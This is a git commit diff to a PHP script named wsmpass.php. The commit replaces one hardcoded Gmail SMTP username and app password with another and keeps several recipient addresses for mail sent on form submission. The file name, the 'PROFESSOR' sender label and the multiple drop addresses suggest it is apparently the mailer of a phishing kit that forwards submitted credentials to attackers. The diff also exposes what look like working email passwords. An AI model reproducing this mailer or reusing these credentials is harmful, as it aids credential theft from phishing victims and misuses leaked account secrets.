5c7f55ddac50d54b81e1e8f8875f909be04857b3
sjhddhfjjjfjfg <sjhddhfjjjfjfg@gmail.com>
2025-07-29 21:07:39 +0500

    Update wsmpass.php

--- wsmpass.php
+++ wsmpass.php
@@ -28,14 +28,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'mixxmine07@gmail.com'; // Replace with your email address
-        $mail->Password   = 'dmqc ieeq lnoa jywr'; // Replace with your email password
+        $mail->Username   = 'hgfver414@gmail.com'; // Replace with your email address
+        $mail->Password   = 'lzgq siya aeus xogl'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('mixxmine07@gmail.com', 'PROFESSOR');
+        $mail->setFrom('hgfver414@gmail.com', 'PROFESSOR');
         $mail->addAddress('babar.azam.official.com@gmail.com');
          $mail->addAddress('mahboobalinizamani@gmail.com');
          $mail->addAddress('rnxsxnnxnx@gmail.com');
